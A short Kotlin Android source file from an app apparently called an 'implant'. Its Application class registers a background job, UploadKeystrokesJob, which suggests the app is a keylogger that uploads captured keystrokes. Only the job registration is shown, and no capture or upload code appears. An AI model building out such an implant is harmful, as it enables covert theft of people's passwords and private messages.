package com.cooperthecoder.implant

import android.app.Application
import com.evernote.android.job.JobManager

class App: Application() {
    override fun onCreate() {
        super.onCreate()
        JobManager.create(this).addJobCreator {
            when (it) {
                UploadKeystrokesJob.TAG -> {
                    UploadKeystrokesJob()
                }

                else -> {
                    null
                }
            }
        }
    }
}

